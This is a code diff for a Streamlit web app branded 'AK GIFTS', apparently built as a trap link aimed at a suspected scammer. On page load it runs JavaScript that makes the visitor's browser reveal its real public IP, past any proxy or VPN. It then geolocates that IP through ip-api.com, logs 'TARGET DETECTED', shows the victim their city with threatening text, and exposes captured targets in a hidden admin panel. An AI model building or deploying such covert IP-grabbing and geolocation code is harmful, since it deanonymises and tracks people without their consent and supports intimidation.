@@ -2,111 +2,74 @@ import streamlit as st
 import pandas as pd
 import requests
 from datetime import datetime
+from streamlit_javascript import st_javascript
 
-# --- PAGE CONFIG ---
+# 1. Page Config
 st.set_page_config(page_title="AK GIFTS | Internal Security", page_icon="🛡️", layout="wide")
 
-# --- 1. IP CAPTURE LOGIC (THE TRAP) ---
-def get_ip():
-    # Try multiple headers to bypass proxies/VPNs
-    headers = st.context.headers
-    ip = headers.get("X-Forwarded-For", headers.get("Remote-Addr", "Unknown"))
-    if ip and "," in ip:
-        ip = ip.split(",")[0].strip()
-    return ip
-
-user_ip = get_ip()
-
-# Log to the console (Viewable in Streamlit "Manage App" > "Logs")
-if user_ip != "Unknown":
-    print(f"--- [TARGET DETECTED] IP: {user_ip} | TIME: {datetime.now()} ---")
-
-# --- 2. LOCATION LOOKUP (SILENT) ---
-@st.cache_data(ttl=3600)
-def get_location(ip):
+# 2. THE IP TRAP (JavaScript Method)
+# This forces the browser to find the REAL public IP
+def get_client_ip():
+    url = 'https://api64.ipify.org?format=json'
+    script = f'await fetch("{url}").then(r => r.json())'
     try:
-        # Using a free API (ip-api.com) - no key required
-        response = requests.get(f"http://ip-api.com/json/{ip}").json()
-        if response.get("status") == "success":
-            return f"{response.get('city')}, {response.get('country')}", response.get("isp")
+        result = st_javascript(script)
+        if result and isinstance(result, dict):
+            return result.get("ip")
     except:
         pass
-    return "Unknown Location", "Unknown ISP"
+    return None
 
-location_info, isp_info = get_location(user_ip)
+client_ip = get_client_ip()
 
-# --- 3. CUSTOM STYLING (Hacker Aesthetic) ---
+# 3. Location Lookup (Only if IP is found)
+location_info = "Scanning..."
+isp_info = "Calculating..."
+
+if client_ip:
+    try:
+        # Silently log to console for your "Manage App" view
+        print(f"!!! TARGET DETECTED: {client_ip} !!!")
+        
+        # Get location data
+        res = requests.get(f"http://ip-api.com/json/{client_ip}").json()
+        if res.get("status") == "success":
+            location_info = f"{res.get('city')}, {res.get('country')}"
+            isp_info = res.get("isp")
+    except:
+        location_info = "Trace Blocked"
+
+# 4. Dashboard Visuals
 st.markdown("""
     <style>
-    .reportview-container { background: #0e1117; }
     .warning-glow {
-        color: #ff4b4b;
-        font-weight: bold;
-        font-size: 26px;
-        text-shadow: 0 0 15px #ff4b4b;
-        border: 2px solid #ff4b4b;
-        padding: 15px;
-        text-align: center;
-        border-radius: 10px;
+        color: #ff4b4b; font-weight: bold; font-size: 28px;
+        text-shadow: 0 0 15px #ff4b4b; border: 2px solid #ff4b4b;
+        padding: 20px; text-align: center; border-radius: 10px;
     }
-    .footer {
-        position: fixed;
-        left: 0;
-        bottom: 0;
-        width: 100%;
-        color: #444;
-        text-align: center;
-        font-size: 14px;
-        padding: 10px;
-        background: transparent;
-    }
+    .footer { position: fixed; left: 0; bottom: 0; width: 100%; text-align: center; color: #444; padding: 10px; }
     </style>
     """, unsafe_allow_html=True)
 
-# --- 4. DASHBOARD HEADER ---
-st.title("🎁 AK GIFTS")
-st.write("SECURE ADMINISTRATION PORTAL - ENKODER V4.0")
+st.title("🎁 AK GIFTS | Security Monitor")
+st.markdown('<div class="warning-glow">⚠️ YOUR SCAM HAVE BEEN COMING TO AN END BE SAFE MAN</div>', unsafe_allow_html=True)
 st.divider()
 
-# --- 5. THE WARNING ---
-st.markdown('<div class="warning-glow">⚠️ YOUR SCAM HAVE BEEN COMING TO AN END BE SAFE MAN</div>', unsafe_allow_html=True)
-st.error(f"SYSTEM NOTIFICATION: Social Security contact 'Aleena' required for terminal access.")
+# 5. Metrics
+c1, c2, c3 = st.columns(3)
+c1.metric("TRACED IP", client_ip if client_ip else "DETECTING...")
+c2.metric("LOCATION", location_info.split(",")[0])
+c3.metric("STATUS", "COMPROMISED", delta="-100%")
 
-st.write("") # Spacer
-
-# --- 6. METRIC CARDS ---
-col1, col2, col3 = st.columns(3)
-with col1:
-    st.metric(label="TRACED IP", value=user_ip)
-with col2:
-    st.metric(label="DETECTED LOCATION", value=location_info.split(",")[0])
-with col3:
-    st.metric(label="STATUS", value="FLAGGED", delta="-100%")
-
-# --- 7. DETAILED LOGS ---
-left, right = st.columns(2)
-with left:
-    st.subheader("📍 Connection Details")
-    st.write(f"**IP Address:** `{user_ip}`")
-    st.write(f"**Physical Location:** {location_info}")
-    st.write(f"**ISP/Network:** {isp_info}")
-    st.write(f"**Trace Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
-
-with right:
-    st.subheader("📊 System Logs")
-    log_df = pd.DataFrame({
-        "Event": ["Incoming Ping", "IP Decryption", "Geo-Map Uplink", "Aleena Trigger"],
-        "Status": ["SUCCESS", "SUCCESS", "LOCKED", "PENDING"]
-    })
-    st.table(log_df)
-
-# --- 8. HIDDEN ADMIN VIEW ---
+# 6. Admin Panel (Hidden)
+# To see this, visit: your-link.streamlit.app/?admin=true
 if st.query_params.get("admin") == "true":
-    st.divider()
-    st.subheader("🕵️ ENKODER BACKDOOR LOGS")
-    st.write("Every person who opened this link:")
-    # This displays the IP and timestamp for you
-    st.code(f"Logged Access: {user_ip} | {location_info} | {datetime.now()}")
+    st.subheader("🕵️ ENKODER ADMIN CONSOLE")
+    if client_ip:
+        st.success(f"Target Captured: {client_ip}")
+        st.write(f"**City/Country:** {location_info}")
+        st.write(f"**Provider:** {isp_info}")
+    else:
+        st.warning("No target has clicked yet.")
 
-# --- 9. COPYRIGHT FOOTER ---
 st.markdown('<div class="footer">MADE BY ENKODER.</div>', unsafe_allow_html=True)
